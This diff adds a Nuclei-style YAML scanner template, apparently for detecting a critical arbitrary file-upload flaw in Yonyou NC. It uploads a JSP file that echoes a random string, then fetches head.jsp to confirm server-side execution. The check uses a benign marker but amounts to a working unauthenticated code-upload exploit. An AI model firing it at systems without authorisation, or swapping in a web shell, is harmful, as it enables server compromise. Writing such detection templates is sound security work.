@@ -1,0 +1,51 @@
+id: poc-yaml-yongyou-grouptemplet-fileupload
+info:
+  name: Yongyou NC Grouptemplet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: yonyou, fileupload, critical
+
+variables:
+  random_content: '{{rand_text_alphanumeric(12)}}'
+  random_name: '{{rand_text_alphanumeric(8)}}'
+  random_id: '{{rand_int(1,100)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/uapim/upload/grouptemplet?groupid={{random_id}}&fileType=jsp'
+    headers:
+      Content-Type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+    body: |-
+      ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+      Content-Disposition: form-data; name="upload"; filename="{{random_name}}.jsp"
+      Content-Type: application/octet-stream
+      
+      <%out.println("{{random_content}}");%>
+      ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "error"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/uapim/static/pages/{{random_id}}/head.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{random_content}}'
